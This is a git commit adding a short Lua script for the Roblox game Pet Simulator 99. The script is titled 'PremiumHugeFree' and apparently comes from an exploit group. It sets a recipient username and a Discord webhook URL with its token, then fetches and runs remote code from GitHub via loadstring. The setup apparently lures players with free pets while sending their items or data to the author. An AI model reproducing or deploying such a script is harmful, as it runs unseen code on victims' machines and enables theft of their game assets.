c004b3a7fc1e5f5a51bfc816b040182985b1851d
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-23 06:49:59 +0200

    Added ps99 script: PremiumHugeFree

---
+++ ps99/PremiumHugeFree.lua
@@ -0,0 +1,5 @@
+Username = "kylegaming3462"
+Username2 = "kylegaming3462"
+Webhook = "https://discord.com/api/webhooks/1364418352960765974/xBpD7sn6LLLoCBOELChL4SxziQQmonXm_JChaClR17yM9wZ_wsev8CK2kt1d7oF9SO1H"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%2099"))()
